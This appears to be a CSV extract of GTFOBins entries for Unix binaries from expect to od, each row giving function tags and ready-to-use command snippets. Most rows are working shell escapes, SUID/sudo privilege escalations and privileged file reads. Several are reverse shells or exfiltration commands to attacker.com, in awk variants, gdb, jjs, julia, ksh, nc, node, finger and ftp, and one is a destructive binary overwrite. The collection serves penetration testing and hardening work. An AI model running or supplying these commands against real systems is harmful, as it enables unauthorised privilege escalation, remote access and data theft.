+expect,https://gtfobins.github.io/gtfobins/expect/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"expect -c 'spawn /bin/sh;interact'; expect; LFILE=file_to_read
+expect $LFILE"
+facter,https://gtfobins.github.io/gtfobins/facter/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp -d)
+echo 'exec(""/bin/sh"")' > $TF/x.rb
+FACTERLIB=$TF facter; sudo; TF=$(mktemp -d)
+echo 'exec(""/bin/sh"")' > $TF/x.rb
+sudo FACTERLIB=$TF facter"
+file,https://gtfobins.github.io/gtfobins/file/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"file; :; LFILE=file_to_read
+file -f $LFILE"
+find,https://gtfobins.github.io/gtfobins/find/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"find . -exec /bin/sh \; -quit; LFILE=file_to_write
+find / -fprintf ""$FILE"" DATA -quit; sh -p"
+finger,https://gtfobins.github.io/gtfobins/finger/,finger hangs waiting for the remote peer to close the socket.,File upload; File download,"finger; sudo nc -l -p 79 | base64 -d > ""file_to_save""; RHOST=attacker.com
+LFILE=file_to_send
+finger ""$(base64 $LFILE)@$RHOST"""
+fish,https://gtfobins.github.io/gtfobins/fish/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,fish; sh -p; -p
+flock,https://gtfobins.github.io/gtfobins/flock/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,flock -u / /bin/sh; sh -p; -p
+fmt,https://gtfobins.github.io/gtfobins/fmt/,The read file content is not binary-safe.,File read; SUID; Sudo,"fmt; LFILE=file_to_read
+fmt -pNON_EXISTING_PREFIX ""$LFILE""; LFILE=file_to_read
+fmt -999 ""$LFILE"""
+fold,https://gtfobins.github.io/gtfobins/fold/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+fold -w99999999 ""$LFILE""; sh -p; -p"
+fping,https://gtfobins.github.io/gtfobins/fping/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
+fping -f $LFILE; sudo; LFILE=file_to_read
+sudo fping -f $LFILE"
+ftp,https://gtfobins.github.io/gtfobins/ftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; Sudo,"ftp
+!/bin/sh; RHOST=attacker.com
+ftp $RHOST
+put file_to_send; RHOST=attacker.com
+ftp $RHOST
+get file_to_get"
+gawk,https://gtfobins.github.io/gtfobins/gawk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File write; File read; SUID; Sudo; Limited SUID,"gawk 'BEGIN {system(""/bin/sh"")}'; nc -l -p 12345; RHOST=attacker.com
+RPORT=12345
+gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
+    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
+    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+gcc,https://gtfobins.github.io/gtfobins/gcc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"gcc -wrapper /bin/sh,-s .; LFILE=file_to_delete
+gcc -xc /dev/null -o $LFILE; LFILE=file_to_read
+gcc -x c -E ""$LFILE"""
+gcloud,https://gtfobins.github.io/gtfobins/gcloud/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; gcloud help
+!/bin/sh; sudo"
+gcore,https://gtfobins.github.io/gtfobins/gcore/,"It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named core.$PID, that is then often filtered with strings to narrow down relevant information.",File read; SUID; Sudo,core.$PID; strings; gcore $PID
+gdb,https://gtfobins.github.io/gtfobins/gdb/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities,"gdb -nx -ex '!sh' -ex quit; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
+export RPORT=12345
+gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(""/bin/sh"")' -ex quit"
+gem,https://gtfobins.github.io/gtfobins/gem/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"rdoc; gem open -e ""/bin/sh -c /bin/sh"" rdoc; vi"
+genie,https://gtfobins.github.io/gtfobins/genie/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,genie -c '/bin/sh'; sh -p; -p
+genisoimage,https://gtfobins.github.io/gtfobins/genisoimage/,"The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like 7z.",File read; SUID; Sudo,"7z; LFILE=file_to_read
+genisoimage -q -o - ""$LFILE""; sh -p"
+ghc,https://gtfobins.github.io/gtfobins/ghc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"ghc -e 'System.Process.callCommand ""/bin/sh""'; sudo; sudo ghc -e 'System.Process.callCommand ""/bin/sh""'"
+ghci,https://gtfobins.github.io/gtfobins/ghci/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"ghci
+System.Process.callCommand ""/bin/sh""; sudo; sudo ghci
+System.Process.callCommand ""/bin/sh"""
+gimp,https://gtfobins.github.io/gtfobins/gimp/,The binary hangs after executing the Python code and can be terminated pressing ctrl-c.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo,"ctrl-c; gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'; socat file:`tty`,raw,echo=0 tcp-listen:12345"
+ginsh,https://gtfobins.github.io/gtfobins/ginsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"ginsh
+!/bin/sh; sudo; sudo ginsh
+!/bin/sh"
+git,https://gtfobins.github.io/gtfobins/git/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo; Limited SUID,"PAGER='sh -c ""exec sh 0<&1""' git -p help; less; git help config
+!/bin/sh"
+grc,https://gtfobins.github.io/gtfobins/grc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,grc --pty /bin/sh; sudo; sudo grc --pty /bin/sh
+grep,https://gtfobins.github.io/gtfobins/grep/,"There are many grep flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: egrep, fgrep, zgrep, etc.",File read; SUID; Sudo,grep; egrep; fgrep
+gtester,https://gtfobins.github.io/gtfobins/gtester/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"TF=$(mktemp)
+echo '#!/bin/sh' > $TF
+echo 'exec /bin/sh -p 0<&1' >> $TF
+chmod +x $TF
+gtester -q $TF; <testbinary path=""DATA"">; LFILE=file_to_write
+gtester ""DATA"" -o $LFILE"
+gzip,https://gtfobins.github.io/gtfobins/gzip/,"There are also a number of other utilities that rely on gzip under the hood, e.g., zless, zcat, gunzip, etc. Besides having similar features, they also allow privileged reads if gzip itself is SUID.",File read; SUID; Sudo,gzip; zless; zcat
+hd,https://gtfobins.github.io/gtfobins/hd/,The output is actually an hex dump.,File read; SUID; Sudo,"LFILE=file_to_read
+hd ""$LFILE""; sh -p; -p"
+head,https://gtfobins.github.io/gtfobins/head/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+head -c1G ""$LFILE""; sh -p; -p"
+hexdump,https://gtfobins.github.io/gtfobins/hexdump/,The output is actually an hex dump.,File read; SUID; Sudo,"LFILE=file_to_read
+hexdump -C ""$LFILE""; sh -p; -p"
+highlight,https://gtfobins.github.io/gtfobins/highlight/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+highlight --no-doc --failsafe ""$LFILE""; sh -p; -p"
+hping3,https://gtfobins.github.io/gtfobins/hping3/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"hping3
+/bin/sh; sh -p; -p"
+iconv,https://gtfobins.github.io/gtfobins/iconv/,"The 8859_1 encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.",File write; File read; SUID; Sudo,"8859_1; LFILE=file_to_write
+echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""; LFILE=file_to_read
+iconv -f 8859_1 -t 8859_1 ""$LFILE"""
+iftop,https://gtfobins.github.io/gtfobins/iftop/,This requires iftop 0.17 and the privilege to capture on some device (specify with -i if needed) .,Shell; Sudo; Limited SUID,"iftop; -i; iftop
+!/bin/sh"
+install,https://gtfobins.github.io/gtfobins/install/,"This can be run with elevated privileges to change permissions (6 denotes the SUID bits) and then read, write, or execute a copy of the file.",SUID; Sudo,6; sh -p; -p
+ionice,https://gtfobins.github.io/gtfobins/ionice/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,ionice /bin/sh; sh -p; -p
+ip,https://gtfobins.github.io/gtfobins/ip/,The read file content is corrupted by error prints.,File read; SUID; Sudo,"LFILE=file_to_read
+ip -force -batch ""$LFILE""; sh -p; -p"
+irb,https://gtfobins.github.io/gtfobins/irb/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo,"irb
+exec '/bin/bash'; nc -l -p 12345; export RHOST='127.0.0.1'
+export RPORT=9000
+irb
+require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end"
+ispell,https://gtfobins.github.io/gtfobins/ispell/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"ispell /etc/passwd
+!/bin/sh; sh -p; -p"
+jjs,https://gtfobins.github.io/gtfobins/jjs/,This tool is installed starting with Java SE 8.,Shell; Reverse shell; File download; File write; File read; SUID; Sudo,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");
+var port=Java.type(""java.lang.System"").getenv(""RPORT"");
+var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");
+var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
+var Socket = Java.type(""java.net.Socket"");
+var s=new Socket(host,port);
+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"
+joe,https://gtfobins.github.io/gtfobins/joe/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"joe
+^K!/bin/sh; sudo; sudo joe
+^K!/bin/sh"
+join,https://gtfobins.github.io/gtfobins/join/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+join -a 2 /dev/null $LFILE; sh -p; -p"
+journalctl,https://gtfobins.github.io/gtfobins/journalctl/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; journalctl
+!/bin/sh; sudo"
+jq,https://gtfobins.github.io/gtfobins/jq/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+jq -Rr . ""$LFILE""; sh -p; -p"
+jrunscript,https://gtfobins.github.io/gtfobins/jrunscript/,This tool is installed starting with Java SE 6.,Shell; Reverse shell; File download; File write; File read; SUID; Sudo,"jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""';
+var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
+var s=new java.net.Socket(host,port);
+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
+while(pi.available()>0)so.write(pi.read());
+while(pe.available()>0)so.write(pe.read());
+while(si.available()>0)po.write(si.read());
+so.flush();po.flush();
+java.lang.Thread.sleep(50);
+try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
+jtag,https://gtfobins.github.io/gtfobins/jtag/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"jtag --interactive
+shell /bin/sh; sudo; sudo jtag --interactive
+shell /bin/sh"
+julia,https://gtfobins.github.io/gtfobins/julia/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File download; File write; File read; SUID; Sudo,"julia -e 'run(`/bin/sh`)'; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"
+knife,https://gtfobins.github.io/gtfobins/knife/,This is capable of running ruby code.,Shell; Sudo,"ruby; knife exec -E 'exec ""/bin/sh""'; sudo"
+ksh,https://gtfobins.github.io/gtfobins/ksh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; SUID; Sudo,"ksh; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"
+ksshell,https://gtfobins.github.io/gtfobins/ksshell/,Each line is corrupted by a prefix string. Also consider that lines are actually parsed as kickstart scripts thus some file contents may lead to unexpected results.,File read; SUID; Sudo,"kickstart; LFILE=file_to_read
+ksshell -i $LFILE; sh -p"
+ksu,https://gtfobins.github.io/gtfobins/ksu/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo ksu -q -e /bin/sh
+kubectl,https://gtfobins.github.io/gtfobins/kubectl/,"It serves files from a specified directory via HTTP, i.e., http://<IP>:4444/x/<file>.",File upload; SUID; Sudo,"http://<IP>:4444/x/<file>; LFILE=dir_to_serve
+kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/; sh -p"
+latex,https://gtfobins.github.io/gtfobins/latex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'; latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
+strings article.dvi; sudo"
+latexmk,https://gtfobins.github.io/gtfobins/latexmk/,This allows to execute perl code.,Shell; File read; Sudo,"perl; latexmk -e 'exec ""/bin/sh"";'; latexmk -latex='/bin/sh #' /dev/null"
+ld.so,https://gtfobins.github.io/gtfobins/ld.so/,"ld.so is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:",Shell; SUID; Sudo,"ld.so; $ strings /proc/self/exe | head -1
+/lib64/ld-linux-x86-64.so.2; /lib/ld.so /bin/sh"
+ldconfig,https://gtfobins.github.io/gtfobins/ldconfig/,Follows a minimal example of how to use the described technique (details may change across different distributions).,Sudo; Limited SUID,"libcap; ping; $ ldd /bin/ping | grep libcap
+      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)"
+less,https://gtfobins.github.io/gtfobins/less/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"less /etc/profile
+!/bin/sh; VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile
+v; less /etc/profile
+v:shell"
+lftp,https://gtfobins.github.io/gtfobins/lftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,lftp -c '!/bin/sh'; sudo; sudo lftp -c '!/bin/sh'
+links,https://gtfobins.github.io/gtfobins/links/,The result is displayed in a TUI interface.,File read; SUID; Sudo,"LFILE=file_to_read
+links ""$LFILE""; sh -p; -p"
+ln,https://gtfobins.github.io/gtfobins/ln/,"This overrides ln itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a sudo rule allows to only run ln by path. Warning, this is a destructive action.",Sudo,"ln; sudo; sudo ln -fs /bin/sh /bin/ln
+sudo ln"
+loginctl,https://gtfobins.github.io/gtfobins/loginctl/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; loginctl user-status
+!/bin/sh; sudo"
+logsave,https://gtfobins.github.io/gtfobins/logsave/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,logsave /dev/null /bin/sh -i; sh -p; -p
+look,https://gtfobins.github.io/gtfobins/look/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+look '' ""$LFILE""; sh -p; -p"
+lp,https://gtfobins.github.io/gtfobins/lp/,It can exfiltrate files on the network.,File upload,cups; lpadmin -p printer -v socket://localhost -E; lpadmin -d printer
+ltrace,https://gtfobins.github.io/gtfobins/ltrace/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"ltrace -b -L /bin/sh; ltrace -F DATA; LFILE=file_to_write
+ltrace -s 999 -o $LFILE ltrace -F DATA"
+lua,https://gtfobins.github.io/gtfobins/lua/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; SUID; Sudo; Limited SUID,"lua -e 'os.execute(""/bin/sh"")'; nc -l -p 12345; lua-socket"
+lualatex,https://gtfobins.github.io/gtfobins/lualatex/,This allows to execute lua code.,Shell; Sudo; Limited SUID,"lua; lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'; sudo"
+luatex,https://gtfobins.github.io/gtfobins/luatex/,This allows to execute lua code.,Shell; Sudo; Limited SUID,"lua; luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'; sudo"
+lwp-download,https://gtfobins.github.io/gtfobins/lwp-download/,Fetch a remote file via HTTP GET request.,File download; File write; File read; Sudo,"URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+lwp-download $URL $LFILE; LFILE=file_to_write
+TF=$(mktemp)
+echo DATA >$TF
+lwp-download file://$TF $LFILE; LFILE=file_to_read
+TF=$(mktemp)
+lwp-download ""file://$LFILE"" $TF
+cat $TF"
+lwp-request,https://gtfobins.github.io/gtfobins/lwp-request/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
+lwp-request ""file://$LFILE""; sudo; LFILE=file_to_read
+sudo lwp-request ""file://$LFILE"""
+mail,https://gtfobins.github.io/gtfobins/mail/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"mail --exec='!/bin/sh'; TF=$(mktemp)
+echo ""From nobody@localhost $(date)"" > $TF
+mail -f $TF
+!/bin/sh; sudo"
+make,https://gtfobins.github.io/gtfobins/make/,All these examples only work with GNU make due to the lack of support of the --eval flag. The same can be achieved by using a proper Makefile or by passing the content via stdin using -f -.,Shell; File write; SUID; Sudo,make; --eval; Makefile
+man,https://gtfobins.github.io/gtfobins/man/,"This invokes the default pager, which is likely to be  less, other functions may apply.",Shell; File read; Sudo,"less; man man
+!/bin/sh; man"
+mawk,https://gtfobins.github.io/gtfobins/mawk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"mawk 'BEGIN {system(""/bin/sh"")}'; LFILE=file_to_write
+mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'; LFILE=file_to_read
+mawk '//' ""$LFILE"""
+minicom,https://gtfobins.github.io/gtfobins/minicom/,"Note that in some versions, Meta-Z is used in place of Ctrl-A.",Shell; SUID; Sudo,Meta-Z; Ctrl-A; Ctrl-A o
+more,https://gtfobins.github.io/gtfobins/more/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"TERM= more /etc/profile
+!/bin/sh; more file_to_read; sh -p"
+mosquitto,https://gtfobins.github.io/gtfobins/mosquitto/,"The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files",File read; SUID; Sudo,"LFILE=file_to_read
+mosquitto -c ""$LFILE""; sh -p; -p"
+mount,https://gtfobins.github.io/gtfobins/mount/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; mount; sudo mount -o bind /bin/sh /bin/mount
+sudo mount"
+msfconsole,https://gtfobins.github.io/gtfobins/msfconsole/,This allows to spawn a ruby interpreter.,Shell; Sudo,"ruby; sudo msfconsole
+msf6 > irb
+>> system(""/bin/sh""); sudo"
+msgattrib,https://gtfobins.github.io/gtfobins/msgattrib/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
+msgattrib -P $LFILE; sh -p"
+msgcat,https://gtfobins.github.io/gtfobins/msgcat/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
+msgcat -P $LFILE; sh -p"
+msgconv,https://gtfobins.github.io/gtfobins/msgconv/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
+msgconv -P $LFILE; sh -p"
+msgfilter,https://gtfobins.github.io/gtfobins/msgfilter/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,-i; kill; echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+msgmerge,https://gtfobins.github.io/gtfobins/msgmerge/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
+msgmerge -P $LFILE /dev/null; sh -p"
+msguniq,https://gtfobins.github.io/gtfobins/msguniq/,"The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,".properties; LFILE=file_to_read
+msguniq -P $LFILE; sh -p"
+mtr,https://gtfobins.github.io/gtfobins/mtr/,The read file content is corrupted by error prints.,File read; Sudo,"LFILE=file_to_read
+mtr --raw -F ""$LFILE""; sudo; LFILE=file_to_read
+sudo mtr --raw -F ""$LFILE"""
+multitime,https://gtfobins.github.io/gtfobins/multitime/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,multitime /bin/sh; sh -p; -p
+mv,https://gtfobins.github.io/gtfobins/mv/,This can be used to move and then read or write files from a restricted file systems or with elevated privileges.,SUID; Sudo,sh -p; -p; sh
+mysql,https://gtfobins.github.io/gtfobins/mysql/,A valid MySQL server must be available.,Shell; Library load; Sudo; Limited SUID,mysql -e '\! /bin/sh'; /path/to/lib.so; mysql --default-auth ../../../../../path/to/lib
+nano,https://gtfobins.github.io/gtfobins/nano/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo; Limited SUID,"nano
+^R^X
+reset; sh 1>&0 2>&0; SPELL; -s"
+nasm,https://gtfobins.github.io/gtfobins/nasm/,"The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
+nasm -@ $LFILE; sh -p; -p"
+nawk,https://gtfobins.github.io/gtfobins/nawk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File write; File read; SUID; Sudo; Limited SUID,"nawk 'BEGIN {system(""/bin/sh"")}'; nc -l -p 12345; RHOST=attacker.com
+RPORT=12345
+nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
+    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
+    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+nc,https://gtfobins.github.io/gtfobins/nc/,It can send back a reverse shell to a listening attacker to open a remote network access.,Reverse shell; Bind shell; File upload; File download; Sudo; Limited SUID,"nc -l -p 12345; RHOST=attacker.com
+RPORT=12345
+nc -e /bin/sh $RHOST $RPORT; nc target.com 12345"
+ncdu,https://gtfobins.github.io/gtfobins/ncdu/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"ncdu
+b; sudo; sudo ncdu
+b"
+ncftp,https://gtfobins.github.io/gtfobins/ncftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"ncftp
+!/bin/sh; sh -p; -p"
+neofetch,https://gtfobins.github.io/gtfobins/neofetch/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"TF=$(mktemp)
+echo 'exec /bin/sh' >$TF
+neofetch --config $TF; LFILE=file_to_read
+neofetch --ascii $LFILE; sudo"
+nft,https://gtfobins.github.io/gtfobins/nft/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version nftables v0.9.0.",File read; SUID; Sudo,"nftables; LFILE=file_to_read
+nft -f ""$LFILE""; sh -p"
+nice,https://gtfobins.github.io/gtfobins/nice/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,nice /bin/sh; sh -p; -p
+nl,https://gtfobins.github.io/gtfobins/nl/,The read file content is corrupted by a leading space added to each line.,File read; SUID; Sudo,"LFILE=file_to_read
+nl -bn -w1 -s '' $LFILE; sh -p; -p"
+nm,https://gtfobins.github.io/gtfobins/nm/,"The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
+nm @$LFILE; sh -p; -p"
+nmap,https://gtfobins.github.io/gtfobins/nmap/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; SUID; Sudo; Limited SUID,"TF=$(mktemp)
+echo 'os.execute(""/bin/sh"")' > $TF
+nmap --script=$TF; nmap --interactive
+nmap> !sh; nc -l -p 12345"
+node,https://gtfobins.github.io/gtfobins/node/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Bind shell; File upload; File download; File write; File read; SUID; Sudo; Capabilities,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
+require(""net"").connect(process.env.RPORT, process.env.RHOST, function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+})'"
+nohup,https://gtfobins.github.io/gtfobins/nohup/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; SUID; Sudo,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""; COMMAND='/usr/bin/id'
+nohup ""$COMMAND""
+cat nohup.out; sh -p"
+npm,https://gtfobins.github.io/gtfobins/npm/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,npm exec /bin/sh; preinstall; npm -C $TF run preinstall
+nroff,https://gtfobins.github.io/gtfobins/nroff/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"TF=$(mktemp -d)
+echo '#!/bin/sh' > $TF/groff
+echo '/bin/sh' >> $TF/groff
+chmod +x $TF/groff
+GROFF_BIN_PATH=$TF nroff; LFILE=file_to_read
+nroff $LFILE; sudo"
+nsenter,https://gtfobins.github.io/gtfobins/nsenter/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,nsenter /bin/sh; sudo; sudo nsenter /bin/sh
+ntpdate,https://gtfobins.github.io/gtfobins/ntpdate/,The file is actually parsed and lines are leaked through error messages.,File read; SUID; Sudo,"LFILE=file_to_read
+ntpdate -a x -k $LFILE -d localhost; sh -p; -p"
+octave,https://gtfobins.github.io/gtfobins/octave/,The payloads are compatible with GUI.,Shell; File write; File read; Sudo; Limited SUID,"octave-cli --eval 'system(""/bin/sh"")'; octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'; octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
+od,https://gtfobins.github.io/gtfobins/od/,"Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences.",File read; SUID; Sudo,"LFILE=file_to_read
+od -An -c -w9999 ""$LFILE""; sh -p; -p"
